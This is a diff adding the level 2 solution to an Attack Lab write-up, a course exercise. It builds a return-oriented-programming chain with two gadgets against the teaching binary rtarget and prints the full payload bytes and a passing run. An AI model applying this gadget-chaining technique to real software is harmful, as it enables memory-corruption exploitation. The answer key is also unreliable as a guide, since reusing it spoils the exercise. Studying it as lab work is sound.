@@ -320,5 +320,29 @@ gadget in `<addval_273>` with a sequence of `48 89 c7 c3`.
   4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
   4019a6:   c3
 ```
+Hence, for the `ret` of `<getbuf>`, we first set the redirection address stack to be `0x4019cc`,
+which is (`0x4019ca` + `0x2`) for the first gadget. As the first gadget will pop a stack value
+to store in register `rax`, we also assure this value to be our cookie. Next, we set the return
+address of first gadget to the second one, which is `0x4019a2`, then following the address of
+`<touch2>`. Here is our solution for this task:
+```
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  00 00 00 00 00 00 00 00
+  cc 19 40 00 00 00 00 00    /* the address of 1st gadget code */
+  fa 97 b9 59 00 00 00 00    /* the value of cookie in hex */
+  a2 19 40 00 00 00 00 00    /* the address of 2nd gadget code */
+  ec 17 40 00 00 00 00 00    /* the address of <touch2> */
+```
+Putting it to `rtarget.exploit.l2.txt`, we can execute and pass the game:
+```sh
+  03-Attack-Lab/src > cat rtarget.exploit.l2.txt | ./hex2raw | ./rtarget -q
+    Cookie: 0x59b997fa
+    Type string:Touch2!: You called touch2(0x59b997fa)
+    Valid solution for level 2 with target rtarget
+    PASS: ...
+```
 
 ## Level 3
